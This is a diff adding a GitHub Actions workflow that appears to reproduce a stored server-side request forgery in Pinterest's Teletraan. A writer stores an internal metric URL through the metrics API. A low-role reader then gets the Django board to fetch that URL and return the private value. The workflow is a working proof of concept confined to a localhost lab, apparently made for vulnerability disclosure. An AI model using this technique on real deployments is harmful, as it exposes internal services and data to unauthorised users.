@@ -1,0 +1,221 @@
+name: Teletraan Metrics Stored SSRF Full Board-to-Backend E2E
+
+on:
+  pull_request:
+    paths:
+      - '.github/workflows/teletraan-metrics-stored-ssrf-20261113.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  native-teletraan-metrics-ssrf:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 24
+    steps:
+      - uses: actions/checkout@v4
+      - name: Checkout official Teletraan source
+        run: |
+          git clone --depth 1 https://github.com/pinterest/teletraan.git upstream
+          cd upstream
+          test "$(git rev-parse HEAD)" = b5212f5ab50486d623fcb493cca36558c70ee467
+          test -z "$(git status --porcelain)"
+      - uses: actions/setup-java@v4
+        with:
+          distribution: corretto
+          java-version: '8'
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.8'
+      - name: Install Django-compatible test runtime
+        run: |
+          python -m pip install -q --upgrade pip
+          python -m pip install -q 'Django==2.2.28' 'django-csp==3.4' 'requests==2.32.3' 'oauthlib==1.0.3' 'concurrent-log-handler==0.9.20' 'python-dateutil==2.8.2' 'pytz==2024.2' 'simplejson==3.19.3' 'diff-match-patch==20241021'
+      - name: Set up exact official MySQL schema and 2 role-limited test identities
+        run: |
+          docker run -d --name teletraan-metrics-db -p 33067:3306 -e MYSQL_ROOT_PASSWORD=lab-only-password mysql:8.4
+          ready=0
+          for i in $(seq 1 100); do
+            if docker exec --env MYSQL_PWD=lab-only-password teletraan-metrics-db mysql -uroot -N -e 'SELECT 1' >/dev/null 2>&1; then ready=1; break; fi
+            sleep 2
+          done
+          test "$ready" = 1
+          docker exec -i --env MYSQL_PWD=lab-only-password teletraan-metrics-db mysql -uroot < upstream/deploy-service/common/src/main/resources/sql/deploy.sql
+          grep -q "ALTER TABLE environs ADD COLUMN stage_type VARCHAR(32)" upstream/deploy-service/common/src/main/resources/sql/schema-update-8.sql
+          grep -q "ALTER TABLE environs MODIFY COLUMN stage_type VARCHAR(32) NOT NULL DEFAULT 'DEFAULT'" upstream/deploy-service/common/src/main/resources/sql/schema-update-11.sql
+          docker exec --env MYSQL_PWD=lab-only-password teletraan-metrics-db mysql -uroot deploy -e "ALTER TABLE environs ADD COLUMN stage_type VARCHAR(32) NOT NULL DEFAULT 'DEFAULT'"
+          docker exec -i --env MYSQL_PWD=lab-only-password teletraan-metrics-db mysql -uroot deploy <<'SQL'
+          INSERT INTO environs
+            (env_id,env_name,stage_name,env_state,max_parallel,priority,stuck_th,success_th,
+             last_operator,last_update,accept_type,max_deploy_num,max_deploy_day,state,override_policy)
+          VALUES
+            ('metricsenv00000000001','metricslab','dev','NORMAL',1,'NORMAL',30,50,
+             'lab',1,'AUTO',2,2,'NORMAL','WARN'),
+            ('otherenv0000000000001','otherlab','dev','NORMAL',1,'NORMAL',30,50,
+             'lab',1,'AUTO',2,2,'NORMAL','WARN');
+          INSERT INTO users_and_roles (user_name,resource_id,resource_type,role) VALUES
+            ('writer-lab','metricslab','ENV','WRITE'),
+            ('writer-lab','*','SYSTEM','READ'),
+            ('reader-lab','*','SYSTEM','READ');
+          SQL
+          test "$(docker exec --env MYSQL_PWD=lab-only-password teletraan-metrics-db mysql -uroot -N deploy -e 'SELECT COUNT(*) FROM users_and_roles')" = 3
+      - name: Build upstream Java Teletraan (no source patches)
+        run: |
+          cd upstream/deploy-service
+          if ! mvn -B -ntp -pl teletraanservice -am -P-pinterest-dependencies,exclude-pinterest-only-classes -DskipTests package > /tmp/teletraan-metrics-maven.log 2>&1; then
+            tail -n 110 /tmp/teletraan-metrics-maven.log
+            exit 1
+          fi
+          echo OFFICIAL_TELETRAAN_JAVA_BUILD=PASS
+      - name: Start synthetic IdP, localhost-only private metric and official role-enforced service
+        run: |
+          mkdir -p /tmp/teletraan /tmp/deploy-board-metrics-lab
+          cat > /tmp/lab-backends.py <<'PY'
+          import json
+          import threading
+          from http.server import BaseHTTPRequestHandler,ThreadingHTTPServer
+          from urllib.parse import urlparse,parse_qs
+          class Identity(BaseHTTPRequestHandler):
+              def do_GET(self):
+                  token=parse_qs(urlparse(self.path).query).get('access_token',[''])[0]
+                  user={'writer-token':'writer-lab','reader-token':'reader-lab'}.get(token)
+                  if user is None:
+                      self.send_response(401);self.end_headers();return
+                  payload={'user':{'username':user}}
+                  self.send_json(payload)
+              def send_json(self,data):
+                  body=json.dumps(data).encode()
+                  self.send_response(200)
+                  self.send_header('Content-Type','application/json')
+                  self.send_header('Content-Length',str(len(body)))
+                  self.end_headers()
+                  self.wfile.write(body)
+              def log_message(self,*a):pass
+          class PrivateMetrics(Identity):
+              def do_GET(self):
+                  with open('/tmp/teletraan-private-metrics-hits.txt','a') as f:
+                      f.write(self.path+'\n')
+                  self.send_json({'data':[{'datapoints': [[1700000000,'PRIVATE_INTERNAL_LAB_METRIC_VALUE']]}]})
+          def serve(port,handler):
+              ThreadingHTTPServer(('127.0.0.1',port),handler).serve_forever()
+          threading.Thread(target=serve,args=(9090,Identity),daemon=True).start()
+          serve(19080,PrivateMetrics)
+          PY
+          nohup python /tmp/lab-backends.py >/tmp/lab-backends.log 2>&1 &
+          for i in $(seq 1 40); do
+            if curl --fail -s 'http://127.0.0.1:9090/?access_token=writer-token' | grep -q writer-lab; then break; fi
+            sleep 0.25
+          done
+          python - <<'PY'
+          from pathlib import Path
+          import re
+          p=Path('upstream/deploy-service/teletraanservice/bin/server.yaml')
+          s=p.read_text()
+          assert '  port: 3306\n' in s and '  password:\n' in s
+          s=s.replace('  port: 3306\n','  port: 33067\n').replace('  password:\n','  password: lab-only-password\n')
+          s=s.replace('port: 8080','port: 8180').replace('port: 8081','port: 8181')
+          s=re.sub(r'(?ms)^workers:\n.*?(?=^# Ping Requst validators:)', 'workers: []\n\n',s)
+          s += '\nauthentication:\n  type: token\n  userDataUrl: http://127.0.0.1:9090\nauthorization:\n  type: role\n'
+          p.write_text(s)
+          PY
+          java -Xmx640m -cp 'upstream/deploy-service/teletraanservice/target/classes:upstream/deploy-service/teletraanservice/target/lib/*:upstream/deploy-service/common/target/classes:upstream/deploy-service/universal/target/classes' com.pinterest.teletraan.TeletraanService server upstream/deploy-service/teletraanservice/bin/server.yaml > /tmp/teletraan-metrics-server.log 2>&1 &
+          echo $! > /tmp/teletraan-metrics-server.pid
+          ready=0
+          for i in $(seq 1 90); do
+            if curl --fail -s -H 'Authorization: Bearer writer-token' -o /tmp/metrics-init.json http://127.0.0.1:8180/v1/envs/metricslab/dev/metrics; then ready=1; break; fi
+            if ! kill -0 "$(cat /tmp/teletraan-metrics-server.pid)" 2>/dev/null; then
+              tail -n 70 /tmp/teletraan-metrics-server.log | cut -c1-300;exit 1
+            fi
+            sleep 2
+          done
+          test "$ready" = 1
+          echo ROLE_ENFORCED_NATIVE_SERVICE_READY=TRUE
+      - name: Negative controls and writer setting private URL via original EnvMetrics API
+        run: |
+          python - <<'PY'
+          import urllib.request,urllib.error,json
+          root='http://127.0.0.1:8180/v1/envs/'
+          payload=[{'title':'internal_only','url':'http://127.0.0.1:19080/private','specs':[]}]
+          def req(env, method, token, body=None):
+              url=root+env+'/dev/metrics'
+              r=urllib.request.Request(url,method=method,headers={'Authorization':'Bearer '+token,'Content-Type':'application/json'},data=json.dumps(body).encode() if body is not None else None)
+              try:
+                  with urllib.request.urlopen(r,timeout=15) as res:
+                      raw=res.read()
+                      return res.status,json.loads(raw) if raw else None
+              except urllib.error.HTTPError as e:
+                  return e.code,None
+          assert req('metricslab','GET','not-valid')[0]==401
+          assert req('metricslab','PUT','reader-token',payload)[0]==403
+          assert req('otherlab','PUT','writer-token',payload)[0]==403
+          assert req('metricslab','PUT','writer-token',payload)[0]==204
+          status,data=req('metricslab','GET','reader-token')
+          assert status==200 and data==payload,(status,data)
+          print('BAD_TOKEN_DENIED_401=TRUE')
+          print('READ_ONLY_WRITE_DENIED_403=TRUE')
+          print('WRITER_CROSS_ENV_DENIED_403=TRUE')
+          print('AUTHORIZED_WRITER_STORES_PRIVATE_METRIC_URL_204=TRUE')
+          print('READER_CAN_READ_STORED_METRICS_CONFIG_200=TRUE')
+          PY
+      - name: Low-role authenticated reader visits ORIGINAL Django get_service_metrics endpoint
+        env:
+          PYTHONPATH: upstream/deploy-board
+          DJANGO_SETTINGS_MODULE: deploy_board.settings
+          OAUTH_ENABLED: 'ON'
+          IS_PINTEREST: 'true'
+          OAUTH_CLIENT_ID: 'lab-client'
+          OAUTH_CLIENT_SECRET: 'lab-only-client-secret'
+          OAUTH_CALLBACK: 'http://127.0.0.1:18888/auth'
+          OAUTH_DOMAIN: 'lab.invalid'
+          OAUTH_ACCESS_TOKEN_URL: 'https://example.invalid/oauth/token'
+          OAUTH_AUTHORIZE_URL: 'https://example.invalid/oauth/authorize'
+          OAUTH_DEFAULT_SCOPE: 'email'
+          OAUTH_USER_INFO_URI: 'https://example.invalid/me'
+          SECRET_KEY: 'random-lab-secret-key-only'
+          TELETRAAN_SERVICE_URL: 'http://127.0.0.1:8180'
+          TELETRAAN_SERVICE_VERSION: 'v1'
+          TELETRAAN_SERVICE_USE_BEARER: 'true'
+          LOG_DIR: /tmp/deploy-board-metrics-lab
+          LOG_LEVEL: INFO
+          DEBUG_MODE: 'OFF'
+        run: |
+          python - <<'PY'
+          import time
+          import json
+          import django
+          from django.test import Client
+          from django.conf import settings
+          from pathlib import Path
+          django.setup()
+          client=Client(enforce_csrf_checks=True)
+          session=client.session
+          session['oauth_token']='reader-token'
+          session['oauth_expires']=time.time()+3600
+          session['teletraan_user']='reader-lab'
+          session.save()
+          client.cookies[settings.SESSION_COOKIE_NAME]=session.session_key
+          hits=Path('/tmp/teletraan-private-metrics-hits.txt')
+          before=len(hits.read_text().splitlines()) if hits.exists() else 0
+          result=client.get('/env/metricslab/dev/get_service_metrics/')
+          assert result.status_code==200,(result.status_code,result.content[:1000])
+          body=json.loads(result.content)
+          assert body['html']['internal_only']==[[1700000000,'PRIVATE_INTERNAL_LAB_METRIC_VALUE']],body
+          after=len(hits.read_text().splitlines())
+          assert after==before+1,(before,after)
+          assert hits.read_text().splitlines()[-1]=='/private'
+          print('READER_SESSION_OAUTH_AUTHENTICATED=TRUE')
+          print('INTERNAL_ONLY_LOOPBACK_SERVICE_INVOKED_FROM_DJANGO=TRUE')
+          print('PRIVATE_INTERNAL_METRIC_VALUE_EXPOSED_TO_READER=TRUE')
+          print('ORIGINAL_JAVA_ROLE_AUTHZ_PLUS_ORIGINAL_DJANGO_ROUTE_E2E=PASS')
+          print('NOTE: Source unchanged; laboratory uses Django 2.2 compatibility runtime vs repo Django 1.11 pin.')
+          PY
+      - name: Debug on failure
+        if: failure()
+        run: |
+          echo '=== TELETRAAN SERVICE ==='
+          tail -n 80 /tmp/teletraan-metrics-server.log 2>/dev/null | cut -c1-280 || true
+          echo '=== PRIVATE SERVICE ==='
+          tail -n 35 /tmp/lab-backends.log 2>/dev/null || true
+          echo '=== MYSQL ==='
+          docker ps -a || true
